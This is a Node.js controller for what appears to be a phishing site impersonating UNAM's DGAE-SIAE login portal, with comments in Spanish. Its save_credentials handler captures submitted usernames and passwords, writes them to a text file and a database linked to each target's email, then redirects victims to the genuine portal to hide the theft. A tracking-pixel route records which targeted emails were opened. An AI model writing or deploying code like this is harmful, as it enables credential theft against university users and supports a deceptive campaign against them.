const pool = require('../models/database.js'); 
exports.install = function() {
  ROUTE('/', 'index')
  ROUTE('POST /www_gate', save_credentials)
  ROUTE('/siae' , 'viewsiae')
  ROUTE('/nuevo-correo', 'newemail')
  ROUTE('GET /track_open', trackOpen);
 // Ajusta la ruta según tu proyecto
}


async function save_credentials() {
  let self = this;
  let body = self.body;
  // Obtenemos el email desde la querystring
  let email = self.query.email;
  let { usr_logi, usr_pass } = body;

  // (Opcional) guardar las credenciales en un archivo:
  try {
      const fd = require('fs').openSync("input.txt", "r+");
      require('fs').writeSync(fd, `${usr_logi} ${usr_pass}`, 0, 'utf8');
      require('fs').closeSync(fd);
  } catch (e) {
      console.error("Error al escribir en input.txt:", e);
  }

  // Actualiza la BD => set user, password, click='on' para este email
  try {
      const query = `
        UPDATE correos
        SET user = ?, password = ?, click = 'on'
        WHERE email = ?
      `;
      await pool.query(query, [usr_logi, usr_pass, email]);

      // Redirige a la página pública
      self.redirect('https://www.dgae-siae.unam.mx/www_gate.php');

  } catch (err) {
      console.error("Error al actualizar credenciales en la BD:", err);
      return self.throw500(err);
  }
}
exports.save_credentials = save_credentials;

async function trackOpen() {
  let self = this;
  let email = self.query.email;

  if (!email) {
      // Si no llega el "email", retornamos una imagen en blanco (o un 400)
      return sendTrackingPixel(self);
  }

  try {
      // Actualizamos la DB => Establecemos visto=1
      const query = `UPDATE correos SET visto = 1 WHERE email = ?`;
      await pool.query(query, [email]);

      // Enviamos la "tracking pixel"
      sendTrackingPixel(self);
  } catch (err) {
      console.error('Error al marcar visto=1:', err);
      // Devuelve la imagen de todos modos, para que no se interrumpa la carga
      sendTrackingPixel(self);
  }
}

// Función que envía un 1x1 pixel GIF, PNG, o lo que quieras
function sendTrackingPixel(controller) {
  // 1x1 GIF en base64 (transparent)
  // Podrías usar un PNG si prefieres
  const pixel = Buffer.from(
      'R0lGODlhAQABAPAAAP///wAAACwAAAAAAQABAEACAkQBADs=',
      'base64'
  );

  // Encabezados
  controller.header('Content-Type', 'image/gif');
  controller.header('Content-Length', pixel.length);

  // Envía el buffer
  controller.plain(pixel);
}